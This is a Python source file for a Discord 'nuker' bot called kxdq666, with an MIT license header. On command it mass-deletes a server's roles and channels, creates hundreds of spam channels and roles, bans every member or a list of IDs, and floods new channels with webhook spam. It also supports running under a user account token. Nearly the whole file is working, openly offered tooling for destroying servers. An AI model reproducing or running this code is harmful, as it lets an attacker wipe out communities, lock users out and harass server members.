license = """MIT License

Copyright (c) 2021 $ I M P#0001

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Softwlare.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
# NOTE the test ban command is for testing the ban all speed of the nuker!

import os, sys, discord, requests, json, threading, random, asyncio
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime

now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

os.system("title kxdq666 Nuker")

if sys.platform == "win32":
    clear = lambda: os.system("cls")
else:
    clear = lambda: os.system("clear")

with open("kxdq/settings.json") as f:
    settings = json.load(f)
token = settings.get("Token")
prefix = settings.get("Prefix")
channel_names = settings.get("Channel Names")
role_names = settings.get("Role Names")
Webhook_users = settings.get("Webhook Usernames")
Webhook_contents = settings.get("Spam Messages")
bot = settings.get("Bot")

if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }

simp = commands.Bot(
    command_prefix=prefix, 
    intents=discord.Intents.all(),
    help_command=None
)

def menu():
    clear()
    print(
    simp_logo
    )

@simp.event
async def on_ready():
    try:
       await simp.change_presence(
         status=discord.Status.invisible
        )
    except Exception:
      pass
    menu()

@simp.command(
  aliases=["NUKE", "nn", "nuke", "hi"]
  )
async def Muke(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
    except:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error.")
      sleep(10)
      _exit(0)
    
    def delete_role(i):
        session.delete(
          f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
          headers=headers
        )
    
    def delete_channel(i):
        session.delete(
          f"https://discord.com/api/v9/channels/{i}",
          headers=headers
        )
    
    def create_channels(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
  
    def create_roles(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/roles",
          headers=headers,
          json=json
        )
    
    try:
       for i in range(3):
         for role in list(ctx.guild.roles):
             threading.Thread(
               target=delete_role,
               args=(role.id, )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads.")
             print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mDeleted role {role}.")
    
       for i in range(3):
         for channel in list(ctx.guild.channels):
             threading.Thread(
               target=delete_channel,
               args=(channel.id, )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads.")
             print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mDeleted channel {channel}.")
     
       for i in range(100):
           threading.Thread(
             target=create_channels,
             args=(random.choice(channel_names), )
           ).start()
           #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads.")
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated channel {random.choice(channel_names)}.")
       
       sleep(3)
       
       for i in range(500):
           threading.Thread(
             target=create_roles,
             args=(random.choice(role_names), )
           ).start()
           #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads")
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated role {random.choice(role_names)}.")


       for i in range(500):
           threading.Thread(
             target=create_channels,
             args=(random.choice(channel_names), )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated channel {random.choice(channel_names)}.")
    except Exception as error:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error" + error)
      sleep(10)
      _exit(0)

@simp.command(
  aliases=["ban", "banall", "ww", "bb"]
  )
async def Banall(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
    except:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error.")
      sleep(10)
      _exit(0)
    
    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
          f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
          headers=headers
        )
    try:
       for i in range(3):
         for member in list(ctx.guild.members):
             threading.Thread(
               target=mass_ban,
               args=(member.id, )
             ).start()
             #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} threads")
             print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mExecuted member {member}.")
       clear()
       menu()
       print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mOperation mass ban successful.")
    except Exception as error:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error" + error)
      sleep(10)
      _exit(0)

@simp.command()
async def lptm(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
       users = open("Simp/ids.txt")
    except:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error.")
      sleep(10)
      _exit(0)
    
    def mass_ban(x):
        sessions = requests.Session()
        sessions.put(
          f"https://discord.com/api/v9/guilds/{guild}/bans/{x}",
          headers=headers
        )
    try:
       for x in users:
           workers = []
           threading.Thread(
             target=mass_ban,
             args=(x, )
           ).start()
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated thread with a count of {threading.active_count()} active threads")
           #print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mExecuted member {x}")
       clear()
       menu()
       print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mOperation test ban successful.")
    except Exception as error:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mConnection error" + error)
      sleep(10)
      _exit(0)

@simp.event
async def on_guild_channel_create(channel):
    try:
       webhook = await channel.create_webhook(name="Wizzed")
       for i in range(120):
           await webhook.send(random.choice(Webhook_contents))
           print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mCreated and spammed webhook {i} times.")
       print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mOperation nuke successful.")
       clear()
       menu()
    except Exception:
      pass

simp_logo = f"""                        \033[38;5;89m
Commands; {prefix}Muke ~ {prefix}Banall
Client; {simp.user}
Prefix; {prefix}
"""

if __name__ == "__main__":
    clear()
    #print("\033[38;5;92m" + license)
    #sleep(3)
    clear()
    print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mLoading client.")
    try:
      simp.run(
        token, 
        bot=bot
      )
    except Exception:
      print(f"\033[38;5;89m[\033[38;5;92m{ftime}\033[38;5;89m] \033[0mSpecified a wrong token or a bot token without all intents.")
      sleep(10)
      _exit(0)
